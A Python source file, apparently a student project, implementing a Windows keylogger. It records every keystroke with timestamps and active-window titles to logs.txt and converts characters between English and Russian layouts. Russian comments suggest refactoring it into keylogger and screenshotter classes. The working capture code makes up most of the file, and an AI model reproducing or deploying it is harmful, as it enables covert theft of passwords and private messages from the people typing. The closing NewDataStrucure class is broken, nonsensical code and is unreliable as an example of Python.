import datetime
import win32gui

from ctypes import windll

from pynput.keyboard import Key, Listener
from datetime import datetime
from dataclasses import dataclass


class Processor:
    def __init__(self):
        eng_chars = "~!@#$%^&qwertyuiop[]asdfghjkl;'zxcvbnm,./QWERTYUIOP{}ASDFGHJKL:\"|ZXCVBNM<>?"
        rus_chars = "ё!\"№;%:?йцукенгшщзхъфывапролджэячсмитьбю.ЙЦУКЕНГШЩЗХЪФЫВАПРОЛДЖЭ/ЯЧСМИТЬБЮ,"
        self.trans_table_en_ru = dict(zip(eng_chars, rus_chars))
        self.trans_table_ru_en = dict(zip(rus_chars, eng_chars))

    def change_en_ru(self, s):
        return ''.join([self.trans_table_en_ru.get(c, c) for c in s])

    def change_ru_en(self, s):
        return ''.join([self.trans_table_ru_en.get(c, c) for c in s])


class Keylogger:
    def __init__(self):
        self.ru_lang = [68748313, 68758528, 68757504, 68749337, 68756480]
        self.en_lang = [67699721, 134809609, 67707913, 67708937, 67701769, 1074348041, 67702793, 403249161,
                        67706889, 67716105, 67703817, 67712009, 67717129, 67705865, 67709961, 67710985, 67718153, 67706880]
        user32 = windll.user32
        hwnd = user32.GetForegroundWindow()
        threadID = user32.GetWindowThreadProcessId(hwnd, None)
        self.start_lang = user32.GetKeyboardLayout(threadID)
        self.key = None
        self.name_last_active_window = None


    def on_release(self, key):
        if key == Key.esc:
            return False

    def on_press(self, key):
        print("{0} pressed".format(key))
        f = open("logs.txt", "a", encoding='utf-8')
        active_window = str(self.get_active_window())

        if self.name_last_active_window != active_window:
            f.write("\n")
            f.write(f"Active window: {active_window} {self.now_time()}\n")

        self.name_last_active_window = active_window
        f.write(f"{self.now_time()} {self.get_key(key)}\n")
        f.close()

    @staticmethod  # пример декорации
    def now_time():
        # Его можно инкапсулировать, так как он не использует свойства класса и метода
        time = datetime.now().time().replace(microsecond=0)
        return str(time)

    def get_active_window(self):
        """
        Также можно использовать комментарии

        :return: активное окно
        """
        window = win32gui.GetForegroundWindow()
        active_window_name = win32gui.GetWindowText(window)
        return active_window_name

    def get_key(self, key):
        key = str(key).replace("'", "")
        user32 = windll.user32
        hwnd = user32.GetForegroundWindow()
        thread_id = user32.GetWindowThreadProcessId(hwnd, None)
        code_lang = user32.GetKeyboardLayout(thread_id)
        proc = Processor()

        if self.start_lang in self.en_lang:
            if code_lang in self.ru_lang and key.find("Key") == -1:
                key = proc.change_en_ru(key)
        elif self.start_lang in self.ru_lang:
            if code_lang in self.en_lang and key.find("Key") == -1:
                key = proc.change_ru_en(key)
        return key


keylogger = Keylogger()
with Listener(on_press=keylogger.on_press, on_release=keylogger.on_release) as listener:
    listener.join()


class Screenshots:
    pass
# Эту всю логику надо перести в вызовы и работу с классами, как указано выше, также разгрузи класс монитор на
# несколько, например кей логгер, скриншотер, обработчик. @dataclass - удобный декоратор класса для хранения
# структуры данных, почтитай


@dataclass
class NewDataStrucure:
    def __init__(self):
        self.par = ""
        self.desc = None

    def __str__(self):
        """
        Строчное представление объекта (как бует представлен, если его попросить в виде str)
        :return:
        """

        raise Exception.__class__.__repr__

    def __repr__(self):
        """
        Описание объекта для систем и всего, что за пайтоном
        :return:
        """

        self.desc = "Ya ne class"
        pass

    def give_me_all_your_data(self, some_arg):
        """
        Интерфейс класса (То, через что его запускать)
        :return:
        """
        return "data" + some_arg
